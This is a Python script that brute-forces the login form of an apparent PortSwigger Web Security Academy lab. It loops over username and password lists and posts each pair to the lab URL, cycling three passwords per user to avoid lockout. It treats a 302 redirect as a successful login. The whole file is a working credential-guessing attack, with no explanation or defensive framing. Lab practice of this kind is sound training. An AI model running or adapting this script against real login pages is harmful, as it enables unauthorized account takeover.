#!/usr/bin/python3

import requests
import random

userFile = '../creds/username.txt'
passwdFile = '../creds/passwords.txt'

with open(userFile, 'r') as user:
	userF = user.readlines()

with open(passwdFile, 'r') as passwd:
	passF = passwd.readlines()

url='https://0a570084045d63a881eb71a500a700d2.web-security-academy.net/login'


def bruteforce(counter):
	
	userCounter = 0
	passwdCounter = 0

	for user in userF:
		for passwd in passF[counter:]:

			if passwdCounter == 3:
				passwdCounter = 0
				break

			try:
				data = {
					'username': user,
					'password': passwd
				}

				fhandler = requests.post(url, data)

				if fhandler.status_code == 302:
					print(fhandler.headers)
					exit(0)


				print(' count: ', userCounter)
				print(f' status: {fhandler.status_code}')
				print(' user: {user} passwd: {passwd}'.format(user=user, passwd=passwd))
				
				userCounter += 1
				passwdCounter += 1

			except KeyboardInterrupt:
				print(' error occured!')
				exit(1)


for counter in range(1, 101, 3):
	bruteforce(counter)